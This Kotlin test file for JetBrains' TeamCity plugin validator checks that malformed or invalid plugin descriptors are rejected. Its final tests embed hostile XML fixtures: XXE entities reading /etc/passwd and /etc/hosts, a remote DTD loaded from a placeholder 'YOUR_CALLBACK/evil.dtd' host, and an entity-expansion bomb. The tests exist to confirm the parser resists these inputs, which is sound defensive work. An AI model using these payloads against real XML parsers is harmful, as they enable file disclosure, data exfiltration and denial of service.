package com.jetbrains.plugin.structure.teamcity.mock

import com.jetbrains.plugin.structure.base.problems.InvalidPluginName
import com.jetbrains.plugin.structure.base.problems.PluginDescriptorIsNotFound
import com.jetbrains.plugin.structure.base.problems.PluginProblem
import com.jetbrains.plugin.structure.base.problems.PropertyNotSpecified
import com.jetbrains.plugin.structure.base.problems.UnexpectedDescriptorElements
import com.jetbrains.plugin.structure.base.utils.getRandomInvalidXmlBasedPluginName
import com.jetbrains.plugin.structure.base.utils.normalizeNewLines
import com.jetbrains.plugin.structure.base.utils.simpleName
import com.jetbrains.plugin.structure.base.utils.writeText
import com.jetbrains.plugin.structure.mocks.BasePluginManagerTest
import com.jetbrains.plugin.structure.rules.FileSystemType
import com.jetbrains.plugin.structure.teamcity.PLUGIN_NAME_FORBIDDEN_WORDS
import com.jetbrains.plugin.structure.teamcity.TeamcityPlugin
import com.jetbrains.plugin.structure.teamcity.TeamcityPluginManager
import com.jetbrains.plugin.structure.teamcity.problems.ForbiddenWordInPluginName
import com.jetbrains.plugin.structure.teamcity.problems.createIncorrectTeamCityPluginFile
import org.junit.Assert
import org.junit.Test
import java.nio.file.Path
import java.nio.file.Paths

class TeamcityInvalidPluginsTest(fileSystemType: FileSystemType) : BasePluginManagerTest<TeamcityPlugin, TeamcityPluginManager>(fileSystemType) {
  override fun createManager(extractDirectory: Path): TeamcityPluginManager =
    TeamcityPluginManager.createManager(extractDirectory)

  @Test
  fun `incorrect plugin file type`() {
    val incorrect = temporaryFolder.newFile("incorrect.txt")
    assertProblematicPlugin(incorrect, listOf(createIncorrectTeamCityPluginFile(incorrect.simpleName)))
  }

  @Test
  fun `plugin file does not exist`() {
    val nonExistentFile = Paths.get("non-existent-file")
    Assert.assertThrows("Plugin file non-existent-file does not exist", IllegalArgumentException::class.java) {
      createPluginSuccessfully(nonExistentFile)
    }
  }

  @Test
  fun `unable to extract plugin`() {
    val brokenZipArchive = temporaryFolder.newFile("broken.zip")
    assertProblematicPlugin(brokenZipArchive, listOf(PluginDescriptorIsNotFound("teamcity-plugin.xml")))
  }

  @Test
  fun `no meta-inf plugin xml found`() {
    val folder = temporaryFolder.newFolder()
    assertProblematicPlugin(folder, listOf(PluginDescriptorIsNotFound("teamcity-plugin.xml")))
  }

  private fun `test invalid plugin xml`(pluginXmlContent: String, expectedProblems: List<PluginProblem>) {
    val pluginFolder = getTempPluginFolder(pluginXmlContent)
    assertProblematicPlugin(pluginFolder, expectedProblems)
  }

  private fun getTempPluginFolder(pluginXmlContent: String): Path {
    val pluginFolder = temporaryFolder.newFolder()
    pluginFolder.resolve("teamcity-plugin.xml").writeText(pluginXmlContent)
    return pluginFolder
  }

  @Test
  fun `completely invalid plugin descriptor`() {
    `test invalid plugin xml`(
      "abracadabra",
      listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `plugin name is not specified`() {
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        name = ""
      },
      listOf(PropertyNotSpecified("name"))
    )
  }

  @Test
  fun `plugin display name is not specified`() {
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        displayName = ""
      },
      listOf(PropertyNotSpecified("display-name"))
    )
  }

  @Test
  fun `plugin display name contains plugin word`() {
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        displayName = "<display-name>My plugin</display-name>"
      },
      listOf(ForbiddenWordInPluginName(PLUGIN_NAME_FORBIDDEN_WORDS))
    )
  }

  @Test
  fun `plugin display name contains teamcity word`() {
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        displayName = "<display-name>Teamcity runner</display-name>"
      },
      listOf(ForbiddenWordInPluginName(PLUGIN_NAME_FORBIDDEN_WORDS))
    )
  }

  @Test
  fun `plugin display name contains unallowed symbols`() {
    for (i in 1..10) {
      val name = getRandomInvalidXmlBasedPluginName(i)
      val expectedProblems = if (name.isBlank()) {
        PropertyNotSpecified("display-name")
      } else {
        InvalidPluginName("teamcity-plugin.xml", name.normalizeNewLines())
      }
      `test invalid plugin xml`(
        perfectXmlBuilder.modify {
          displayName = "<display-name>$name</display-name>"
        },
        listOf(expectedProblems)
      )
    }
  }

  @Test
  fun `plugin display name contains emoji`() {
    val name = "My best cat 😺"
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        displayName = "<display-name>$name</display-name>"
      },
      listOf(InvalidPluginName("teamcity-plugin.xml", name))
    )
  }

  @Test
  fun `plugin version is not specified`() {
    `test invalid plugin xml`(
      perfectXmlBuilder.modify {
        version = ""
      },
      listOf(PropertyNotSpecified("version"))
    )
  }


  @Test
  fun `failed to parse xml with xxe in value`() {
    val xxe = """
      <!DOCTYPE description [
        <!ENTITY file SYSTEM "file:///etc/passwd">
      ]>

      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
        <info>
          <name>Octopus.TeamCity</name>
          <display-name>Octopus Deploy integration</display-name>
          <version>6.1.15</version>
          <description>&file;</description>

          <vendor>
            <name>Octopus Deploy Pty. Ltd.</name>
            <url>http://octopusdeploy.com</url>
          </vendor>
        </info>
        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
      </teamcity-plugin>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with xxe in attribute`() {
    val xxe = """
      <!DOCTYPE doc [
        <!ENTITY ff SYSTEM "file:///etc/hosts">
      ]>

      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
        <info>
          <name>Octopus.TeamCity</name>
          <display-name>Octopus Deploy integration</display-name>
          <version>6.1.15</version>
          <description info="&ff;">test</description>
          <vendor>
            <name>Octopus Deploy Pty. Ltd.</name>
            <url>http://octopusdeploy.com</url>
          </vendor>
        </info>
        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
      </teamcity-plugin>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with remote dtd xxe`() {
    val xxe = """
      <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://YOUR_CALLBACK/evil.dtd">
        %remote;
      ]>

      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
        <info>
          <name>Octopus.TeamCity</name>
          <display-name>Octopus Deploy integration</display-name>
          <version>6.1.15</version>
          <description>test</description>

          <vendor>
            <name>Octopus Deploy Pty. Ltd.</name>
            <url>http://octopusdeploy.com</url>
          </vendor>
        </info>
        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
      </teamcity-plugin>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with error local dtd`() {
    val xxe = """
      <!DOCTYPE root [
        <!ENTITY % local "abc">
        <!ENTITY name "%local;">
        <!ENTITY ex "start &name; end">
      ]>

      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
        <info>
          <name>Octopus.TeamCity</name>
          <display-name>Octopus Deploy integration</display-name>
          <version>6.1.15</version>
          <description>&ex;</description>

          <vendor>
            <name>Octopus Deploy Pty. Ltd.</name>
            <url>http://octopusdeploy.com</url>
          </vendor>
        </info>
        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
      </teamcity-plugin>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }

  @Test
  fun `failed to parse xml with xml bomb`() {
    val xxe = """
      <!DOCTYPE lolz [
       <!ENTITY a "aaaaaaaaaa">
       <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
       <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
       <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
       <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
      ]>

      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
        <info>
          <name>Octopus.TeamCity</name>
          <display-name>Octopus Deploy integration</display-name>
          <version>6.1.15</version>
          <description>&e;</description>

          <vendor>
            <name>Octopus Deploy Pty. Ltd.</name>
            <url>http://octopusdeploy.com</url>
          </vendor>
        </info>
        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
      </teamcity-plugin>
    """.trimIndent()

    `test invalid plugin xml`(
      pluginXmlContent = xxe,
      expectedProblems = listOf(UnexpectedDescriptorElements(1))
    )
  }
}
